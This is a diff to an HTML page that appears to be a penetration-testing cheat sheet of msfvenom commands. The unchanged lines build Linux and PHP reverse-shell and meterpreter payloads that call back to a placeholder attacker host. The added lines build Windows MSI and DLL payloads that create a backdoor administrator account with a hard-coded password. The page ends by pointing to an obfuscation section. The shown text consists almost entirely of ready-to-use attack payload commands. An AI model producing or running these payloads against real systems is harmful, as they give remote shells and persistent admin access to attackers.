@@ -9,4 +9,11 @@ msfvenom --platform linux -p linux/x86/shell/reverse_tcp LHOST=w.z.y.z LPORT=xxx
 <br/>
 msfvenom -p php/meterpreter/reverse_tcp LHOST=w.x.y.z LPORT=xxxx -e php/base64 -f raw &gt; ~/Downloads/msfvenom.php<br/>
 <br/>
-</body></html>
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi<br/>
+<br/>
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f dll -o rotten.dll<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+See also under 'Obfuscation' section</body></html>
